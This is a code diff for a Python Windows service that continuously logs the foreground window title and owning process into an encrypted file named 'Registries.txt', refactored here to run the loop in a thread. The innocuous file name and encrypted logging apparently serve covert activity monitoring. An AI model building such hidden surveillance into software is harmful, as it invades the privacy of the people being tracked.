@@ -1,4 +1,4 @@
-from program.service import Service
+from program.service import Service, threaded
 
 from win32gui import GetWindowText, GetForegroundWindow
 import psutil, win32process
@@ -10,18 +10,17 @@ class Manager(Service):
     def __init__(
                 self,
                 base_dir='log',
-                key=None,
+                fernet=None,
                 file_name='Registries.txt'):
         '''
         args:
             base_dir: Directory where the input or output files will be stored
             key: Secret Key for encryption and decryption
         '''
-        super().__init__(base_dir, key, file_name)
-        self.fernet = Fernet(self.key)
-
-        while True:
-            self.manager()
+        super().__init__(
+            base_dir=base_dir,
+            fernet=fernet,
+            file_name=file_name)
 
 
     def write_log(self, app: str, title: str):
@@ -51,3 +50,9 @@ class Manager(Service):
                 pid_res = None
             title = GetWindowText(GetForegroundWindow())
             self.write_log(str(pid_res),title)
+
+    
+    @threaded
+    def satart_service(self):
+        while True:
+            self.manager()
